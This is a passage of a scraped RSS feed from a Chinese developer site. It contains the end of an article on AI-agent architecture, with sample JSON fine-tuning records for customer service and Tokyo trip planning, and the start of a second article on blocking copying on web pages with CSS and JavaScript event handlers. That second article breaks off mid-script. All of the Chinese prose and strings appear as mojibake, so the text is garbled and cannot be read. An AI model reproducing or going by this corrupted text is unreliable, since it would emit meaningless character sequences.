<h2 data-id="heading-11">å¼ºåŒ–ä¸è®­ç»ƒ</h2>
<p>æ¨¡å‹å‘å±•äº†ä¸‰å¹´ç»å†äº†ä¸‰ä¸ªæ—¶ä»£ï¼š<strong>ç™¾æ¨¡å¤§æˆ˜æ¨¡å‹è®­ç»ƒ â†’ å¥—å£³ä¸ºè£ï¼Œæç¤ºè¯å·¥ç¨‹ â†’ CoT</strong>ï¼Œä¹Ÿå°±æ˜¯å½“å‰<strong>ä¸šå†…æ™®éå¯¹äºæ¨¡å‹è®­ç»ƒæ˜¯ååˆ†æ’æ–¥çš„</strong>ï¼Œè¿™æ„å‘³ç€æŠ€æœ¯è´Ÿè´£äººè¯´å‡ºè¦è®­ç»ƒï¼Œè¿™ç¬”é¢„ç®—å¯èƒ½ä¼šæœ‰å¾ˆå¤§çš„å‹åŠ›...</p>
<p>åªä¸è¿‡ï¼Œè™½ç„¶åŸºç¡€æ¨¡å‹å·²ç»å…·å¤‡å¼ºå¤§çš„èƒ½åŠ›ï¼Œä½†è¦è®©æ¨¡å‹åœ¨ç‰¹å®šAgentæ¶æ„ä¸­å‘æŒ¥æœ€ä½³æ•ˆæœï¼Œå¾€å¾€éœ€è¦é’ˆå¯¹æ€§åœ°å­¦ä¹ ä½¿ç”¨æ–°å·¥å…·å’Œæ–°çŸ¥è¯†ã€‚ç™½çš®ä¹¦æ€»ç»“äº†ä¸‰ç§ä¸»è¦æ–¹æ³•ï¼š</p>
<p><strong>ä¸€ã€ä¸Šä¸‹æ–‡å†…å­¦ä¹ ï¼ˆIn-context Learningï¼‰ï¼š</strong></p>
<p>åœ¨æ¨ç†æ—¶ä¸ºæ¨¡å‹æä¾›ä»»åŠ¡ç›¸å…³çš„æç¤ºã€å·¥å…·è¯´æ˜å’Œå°‘é‡ç¤ºä¾‹ï¼Œè®©æ¨¡å‹â€œåœ¨çº¿â€å­¦ä¹ å¦‚ä½•ä½¿ç”¨å·¥å…·ã€‚</p>
<p>ä¾‹å¦‚ï¼Œé€šè¿‡å‡ ä¸ªç¤ºä¾‹å¯¹è¯å±•ç¤ºåœ¨ç±»ä¼¼åœºæ™¯ä¸‹ä½¿ç”¨å“ªç§å·¥å…·ã€æ€æ ·è°ƒç”¨ï¼Œå¯æå‡æ¨¡å‹çš„å·¥å…·è°ƒç”¨å‡†ç¡®ç‡ã€‚</p>
<p>ReAct æœ¬èº«å°±æ˜¯ä¸€ç§å…¸å‹çš„ä¸Šä¸‹æ–‡ç¤ºä¾‹é©±åŠ¨çš„æç¤ºæ¡†æ¶ã€‚</p>
<p><strong>äºŒã€æ£€ç´¢å¼ä¸Šä¸‹æ–‡å­¦ä¹ ï¼ˆRetrieval-based In-context Learningï¼‰ï¼š</strong></p>
<p>è‡ªåŠ¨æ£€ç´¢<strong>å’Œé€‰æ‹©æœ€ç›¸å…³çš„çŸ¥è¯†ç‰‡æ®µ</strong>ã€ç¤ºä¾‹æˆ–å·¥å…·è¯´æ˜ä½œä¸ºæç¤ºçš„ä¸€éƒ¨åˆ†ï¼Œä»å¤–éƒ¨è®°å¿†åº“ï¼ˆå¦‚â€œç¤ºä¾‹å­˜å‚¨â€æˆ–çŸ¥è¯†åº“ï¼‰ä¸­åŠ¨æ€æ„é€ æç¤ºã€‚</p>
<p>è¿™ç±»ä¼¼äºç»™æ¨¡å‹â€œæä¾›ä¸€æœ¬åŠ¨çš„èœè°±â€ï¼šè®©å®ƒæ ¹æ®æŸ¥è¯¢ä»çŸ¥è¯†åº“æ£€ç´¢ç¤ºä¾‹æ¥æŒ‡å¯¼å†³ç­–ã€‚</p>
<p><strong>ä¸‰ã€å¾®è°ƒè®­ç»ƒï¼ˆFine-tuningï¼‰ï¼š</strong></p>
<p>æœ€åå°±æ˜¯å¾®è°ƒäº†ï¼Œä½¿ç”¨å¤§é‡ç‰¹å®šä»»åŠ¡çš„ç¤ºä¾‹æ•°æ®å¯¹æ¨¡å‹è¿›è¡Œå¾®è°ƒï¼Œå¯ä»¥æ›´å¥½çš„æé«˜æ•ˆæœã€‚æ¯”å¦‚ï¼Œä¸ºå®¢æœæ™ºèƒ½ä½“å¾®è°ƒæ¨¡å‹ï¼Œè®©å®ƒå­¦ä¼šä¼˜å…ˆè°ƒç”¨çŸ¥è¯†åº“å·¥å…·è€Œä¸æ˜¯ç›´æ¥â€œèƒ¡ä¹±å›ç­”â€ã€‚</p>
<p>è¿™é‡Œæ˜¯ä¸€äº›è®­ç»ƒæ•°æ®æ¡ˆä¾‹ï¼Œå¤§å®¶æ„Ÿå—ä¸‹å°±å¥½ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"ã€å†…éƒ¨æ–‡æ¡£æ‘˜å½•ã€‘æœ¬å…¬å¸æ ‡å‡†é€€è´§æ”¿ç­–ä¸ºï¼šè‡ªæ”¶è´§ä¹‹æ—¥èµ· 7 æ—¥å†…å¯æ— ç†ç”±é€€è´§ï¼Œè¶…è¿‡ 7 æ—¥ä¸äºˆå—ç†ã€‚"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"question"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"ä½ ä»¬é€€è´§æ”¿ç­–æ˜¯æ€æ ·çš„ï¼Ÿ"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"answer"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"æ ¹æ®æˆ‘ä»¬çš„æ ‡å‡†é€€è´§æ”¿ç­–ï¼Œè‡ªæ”¶è´§ä¹‹æ—¥èµ· 7 æ—¥å†…æ‚¨å¯ä»¥æ— ç†ç”±é€€è´§ï¼Œè¶…è¿‡ 7 æ—¥åˆ™æ— æ³•åŠç†é€€è´§ã€‚"</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">{</span>
<span class="hljs-attr">"goal"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"å¸®ç”¨æˆ·è§„åˆ’ä¸€ä¸ª 3 å¤©çš„ä¸œäº¬è‡ªç”±è¡Œï¼Œé¢„ç®—é€‚ä¸­ï¼Œå–œæ¬¢ç¾é£Ÿå’ŒåŠ¨æ¼«æ–‡åŒ–ã€‚"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"search_flights"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"search_hotels"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"search_attractions"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"plan"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"steps"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
Â  Â  Â  <span class="hljs-punctuation">{</span>
Â  Â  Â  Â Â <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"ç¡®å®šå‡ºå‘å’Œè¿”å›æ—¥æœŸï¼Œå¹¶æŸ¥è¯¢å¾€è¿”æœºç¥¨é€‰é¡¹"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"search_flights"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"å‡ºå‘åŸå¸‚"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"ä¸œäº¬"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"å‡ºå‘æ—¥æœŸ"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"è¿”å›æ—¥æœŸ"</span><span class="hljs-punctuation">]</span>
Â  Â  Â  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â  Â  Â  <span class="hljs-punctuation">{</span>
Â  Â  Â  Â Â <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"æ ¹æ®é¢„ç®—å’Œåœ°ç†ä½ç½®æœç´¢é…’åº—ï¼ˆä¼˜å…ˆæ–°å®¿ã€æ¶©è°·é™„è¿‘ï¼‰"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"search_hotels"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"ä¸œäº¬"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"3 æ™š"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"é¢„ç®—èŒƒå›´"</span><span class="hljs-punctuation">]</span>
Â  Â  Â  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â  Â  Â  <span class="hljs-punctuation">{</span>
Â  Â  Â  Â Â <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"æ ¹æ®ç”¨æˆ·å…´è¶£ç­›é€‰æ™¯ç‚¹ï¼ˆåŠ¨æ¼«æ–‡åŒ–ã€ç¾é£Ÿè¡—ï¼‰å¹¶æŒ‰å¤©åˆ†é…"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"search_attractions"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"ä¸œäº¬"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"åŠ¨æ¼«"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"ç¾é£Ÿ"</span><span class="hljs-punctuation">]</span>
Â  Â  Â  <span class="hljs-punctuation">}</span>
Â  Â  <span class="hljs-punctuation">]</span>
Â  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">{</span><span class="hljs-attr">"messages"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
Â  <span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"system"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä»»åŠ¡è§„åˆ’åŠ©æ‰‹ï¼Œæ”¶åˆ°ç”¨æˆ·ç›®æ ‡ååªè¾“å‡º JSON æ ¼å¼çš„ä»»åŠ¡æ‹†è§£è®¡åˆ’ã€‚"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â  <span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"å¸®æˆ‘è§„åˆ’ä¸€ä¸ª 3 å¤©çš„ä¸œäº¬è‡ªç”±è¡Œï¼Œé¢„ç®—é€‚ä¸­ï¼Œæˆ‘å–œæ¬¢ç¾é£Ÿå’ŒåŠ¨æ¼«ã€‚"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â  <span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"{"</span>steps<span class="hljs-string">": [\
Â  Â  Â  {"</span>step_id<span class="hljs-string">": 1, "</span>description<span class="hljs-string">": "</span>ç¡®è®¤å‡ºå‘/è¿”å›æ—¥æœŸå¹¶æŸ¥è¯¢æœºç¥¨<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_flights<span class="hljs-string">"},\
Â  Â  Â  {"</span>step_id<span class="hljs-string">": 2, "</span>description<span class="hljs-string">": "</span>æ ¹æ®é¢„ç®—å’Œä½ç½®é€‰æ‹©é…’åº—<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_hotels<span class="hljs-string">"},\
Â  Â  Â  {"</span>step_id<span class="hljs-string">": 3, "</span>description<span class="hljs-string">": "</span>ä¸º <span class="hljs-number">3</span> å¤©åˆ†åˆ«å®‰æ’æ™¯ç‚¹å’Œç¾é£Ÿ<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_attractions<span class="hljs-string">"}\
Â  Â  ]}"</span>
Â  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>
</code></pre>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šï¼Œè¿™ä¸‰ä¸ªå¾€å¾€ä¼šæ··ç”¨ã€‚</p>
<h2 data-id="heading-12">ç»“è¯­</h2>
<p>ç™½çš®ä¹¦åé¢è¿˜ä¼šæ¶‰åŠ<strong>å¤šAgentæ¶æ„ã€é«˜å¹¶å‘æ¶æ„è®¾è®¡ã€å®‰å…¨</strong>ç­‰æ¨¡å—ï¼Œç¨å¾®æœ‰äº›æ³›æ³›è€Œè°ˆï¼Œè€Œæˆ‘ä»¬ä»Šå¤©å®šä½å¦‚æœæ˜¯å…¥é—¨çº§å†…å®¹çš„è¯å°±ä¸å»æ¶‰åŠäº†ã€‚</p>
<p>æœ€åè¿˜æ˜¯æ€»ç»“ä¸€ä¸‹ï¼Œè¿™ä»½Agentç™½çš®ä¹¦å…¨é¢æ¢³ç†äº† AI Agentï¼ˆæ™ºèƒ½ä½“ï¼‰æŠ€æœ¯æ¶æ„çš„æ ¸å¿ƒè¦ç´ ï¼Œä»–æœ¬èº«åŒ…å«ä¸€éƒ¨åˆ†å®è·µæŠ€å·§ï¼Œä½†æœ‰ç‚¹å–è‡ªå·±äº‘æœåŠ¡çš„å«Œç–‘ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä¸æ¶‰åŠäº†ã€‚</p>
<p>æ€»ä¹‹ï¼Œå¸Œæœ›æœ¬æ–‡å¯¹å¤§å®¶æœ‰ç”¨å§ï¼Œä½œä¸ºå…¥é—¨çº§ç§‘æ™®å†…å®¹ï¼Œæˆ‘è§‰å¾—ä»–è¿˜æ˜¯åˆæ ¼çš„ã€‚åªæ˜¯å¯æƒœåˆæµªè´¹æˆ‘5ä¸ªå°æ—¶...</p>
<h2 data-id="heading-13">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨]]></title>    <link>https://juejin.cn/post/7581727073582137395</link>    <guid>https://juejin.cn/post/7581727073582137395</guid>    <pubDate>2025-12-10T02:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073582137395" data-draft-id="7573972055269244966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T02:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆ˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:54:37.000Z" title="Wed Dec 10 2025 02:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¤§åï¼åœ¨æˆ‘ä»¬å†™å‰ç«¯çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šé‡åˆ°è¿™ç§<strong>ç¦æ­¢ç”¨æˆ·å¤æ‚ç½‘é¡µå†…å®¹</strong>çš„éœ€æ±‚ï¼Œè¿™é‡Œæ¥åˆ†äº«å‡ ç§å¸¸è§çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•ä¹Ÿä¸èƒ½å®Œå…¨é˜»æ­¢å†…å®¹è¢«å¤åˆ¶ã€‚</p>
<p>å› ä¸ºç”¨æˆ·è¿˜æ˜¯å¯ä»¥é€šè¿‡å¼€å‘è€…å·¥å…·ï¼Œæˆªå›¾æå–æ–‡å­—ç­‰ç­‰è¿™äº›æ–¹å¼æ¥è¿›è¡Œå¤åˆ¶ã€‚ä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæå‡å¤åˆ¶çš„é—¨æ§›ï¼Œé˜²æ­¢æ™®é€šç”¨æˆ·éšæ„å¤åˆ¶ã€‚</p>
<hr/>
<p>ä»¥ä¸‹æ˜¯å‡ ç§å¸¸ç”¨æ–¹æ¡ˆï¼š</p>
<h3 data-id="heading-0">1. <strong>ç¦ç”¨æ–‡æœ¬é€‰æ‹©</strong></h3>
<p>ä½¿ç”¨ CSS ç¦æ­¢ç”¨æˆ·é€‰ä¸­æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span> {
  -webkit-user-select: none; <span class="hljs-comment">/* Safari */</span>
  -moz-user-select: none;    <span class="hljs-comment">/* Firefox */</span>
  -ms-user-select: none;     <span class="hljs-comment">/* IE/Edge */</span>
  user-select: none;         <span class="hljs-comment">/* æ ‡å‡†è¯­æ³• */</span>
}
</code></pre>
<p>ä¹Ÿå¯ä»¥é’ˆå¯¹ç‰¹å®šå…ƒç´ è®¾ç½®ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>è¿™æ®µæ–‡å­—æ— æ³•è¢«é€‰ä¸­<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ç”¨æˆ·ä»å¯æŸ¥çœ‹æºä»£ç æˆ–ä½¿ç”¨å…¶ä»–æ‰‹æ®µå¤åˆ¶ã€‚</p>
<hr/>
<h3 data-id="heading-1">2. <strong>ç›‘å¬å¹¶é˜»æ­¢å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´äº‹ä»¶</strong></h3>
<p>é€šè¿‡ JavaScript æ‹¦æˆªç›¸å…³é”®ç›˜å’Œå‰ªè´´æ¿äº‹ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'copy'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'å¤åˆ¶å·²è¢«ç¦æ­¢'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'cut'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'å‰ªåˆ‡å·²è¢«ç¦æ­¢'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'paste'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'ç²˜è´´å·²è¢«ç¦æ­¢'</span>);
});
</code></pre>
<p>ç”¨æˆ·è¿˜æ˜¯å¯ä»¥æŒ‰ä¸‹F12ç¦ç”¨ JavaScript æˆ–ç»•è¿‡äº‹ä»¶ç›‘å¬ã€‚</p>
<hr/>
<h3 data-id="heading-2">3. <strong>å°†å†…å®¹åµŒå…¥å›¾ç‰‡æˆ– Canvas</strong></h3>
<p>å°†å…³é”®å†…å®¹æ¸²æŸ“ä¸ºå›¾ç‰‡æˆ–ä½¿ç”¨ <code>&lt;canvas&gt;</code> ç»˜åˆ¶ï¼Œä½¿æ–‡æœ¬ä¸å¯ç›´æ¥é€‰ä¸­ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"text-as-image.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"ä¸å¯å¤åˆ¶çš„æ–‡å­—"</span>&gt;</span>
</code></pre>
<p>æˆ–ä½¿ç”¨ canvas åŠ¨æ€ç»˜åˆ¶ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myCanvas"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
